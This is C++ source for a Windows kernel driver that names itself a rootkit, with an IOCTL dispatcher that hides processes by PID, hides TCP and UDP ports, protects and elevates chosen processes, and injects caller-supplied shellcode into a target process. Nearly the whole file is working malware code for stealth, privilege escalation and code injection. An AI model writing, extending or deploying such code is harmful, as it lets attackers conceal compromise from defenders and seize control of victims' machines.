#include "rootkit.hpp"
#include "dispatcher.hpp"


VOID AddStructure(USHORT lTCP, USHORT rTCP, USHORT UDP)
{
    using namespace Rootkit::NetHook;

    AutoLock lock(Net.Lock);
    for (UINT32 i = 0; i < UMAX; i++)
    {
        if (Net.LTCP[i] == 0 && Net.RTCP[i] == 0 && Net.UDP[i] == 0)
        {
            Net.LTCP[i] = lTCP;
            Net.RTCP[i] = rTCP;
            Net.UDP[i] = UDP;

            Net.Count++;
            return;
        }
    }
    return;
}

_Use_decl_annotations_
NTSTATUS Dispatch::DriverCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

PVOID buffer = { 0 };

NTSTATUS Dispatch::DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
    NTSTATUS status = STATUS_SUCCESS;
    ULONG bytesIO = 0;
    auto stack = IoGetCurrentIrpStackLocation(Irp);

    switch (stack->Parameters.DeviceIoControl.IoControlCode)
    {
    case IOCTL_HIDEPROC:
    {
#if DEBUG
        DbgPrint("[+] Received request to hide process\n");
#endif
        auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
        if (len < sizeof(PidData))
        {
#if DEBUG
            DbgPrint("[-] Received too small buffer\n");
#endif
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }

        auto data = (PidData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
        if (data == nullptr)
        {
#if DEBUG
            DbgPrint("[-] Received empty buffer\n");
#endif
            status = STATUS_INVALID_PARAMETER;
            break;
        }

        UINT32 PID = data->Pid;
        Rootkit::HideProc(PID);
        break;
    }

    case IOCTL_HIDEPORT:
    {
#if DEBUG
        DbgPrint("[+] Received request to hide port\n");
#endif
        auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
        if (len < sizeof(HideProtocol))
        {
#if DEBUG
            DbgPrint("[-] Received too small buffer\n");
#endif
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }

        auto data = (HideProtocol*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
        if (data == nullptr)
        {
#if DEBUG
            DbgPrint("[-] Received empty buffer\n");
#endif
            status = STATUS_INVALID_PARAMETER;
            break;
        }

        USHORT LTCP = data->LTCP;
        USHORT RTCP = data->RTCP;
        USHORT UDP = data->UDP;

        AddStructure(LTCP, RTCP, UDP);

        break;
    }

    case IOCTL_PROTPROC:
    {
#if DEBUG
        DbgPrint("[+] Received request to hide port\n");
#endif
        auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
        if (len < sizeof(PidData))
        {
#if DEBUG
            DbgPrint("[-] Received too small buffer\n");
#endif
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }

        auto data = (PidData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
        if (data == nullptr)
        {
#if DEBUG
            DbgPrint("[-] Received empty buffer\n");
#endif
            status = STATUS_INVALID_PARAMETER;
            break;
        }

        UINT32 PID = data->Pid;
        Rootkit::ProtectProcess(PID);
        break;
    }

    case IOCTL_ELEVPROC:
    {
#if DEBUG
        DbgPrint("[+] Received request to hide port\n");
#endif
        auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
        if (len < sizeof(PidData))
        {
#if DEBUG
            DbgPrint("[-] Received too small buffer\n");
#endif
            status = STATUS_BUFFER_TOO_SMALL;
            break;
        }

        auto data = (PidData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
        if (data == nullptr)
        {
#if DEBUG
            DbgPrint("[-] Received empty buffer\n");
#endif
            status = STATUS_INVALID_PARAMETER;
            break;
        }

        UINT32 PID = data->Pid;
        Rootkit::ProcessElevation(PID);
        break;
    }

    case IOCTL_SHELL:
    {
#if DEBUG
        DbgPrint("[+] Received request to inject shellcode\n");
#endif

        Shell* shell = (Shell*)Irp->AssociatedIrp.SystemBuffer;
        if (shell == NULL)
        {
#if DEBUG
            DbgPrint("[-] Received empty buffer\n");
#endif

            status = STATUS_INVALID_PARAMETER;
            break;
        }

        if (shell->pid == NULL || shell->shellcode == NULL || shell->size == NULL)
        {
#if DEBUG
            DbgPrint("[-] Received empty parameter\n");
#endif

            status = STATUS_INVALID_PARAMETER;
            break;
        }

        buffer = Rootkit::InjectShellcode(shell);
        bytesIO = sizeof(Shell);

        break;
    }


    case IOCTL_GETBUFF:
    {
        PVOID* outBuffer = (PVOID*)Irp->AssociatedIrp.SystemBuffer;
        *outBuffer = buffer;

        status = STATUS_SUCCESS;
        bytesIO = sizeof(*outBuffer);

        break;
    }

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesIO;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}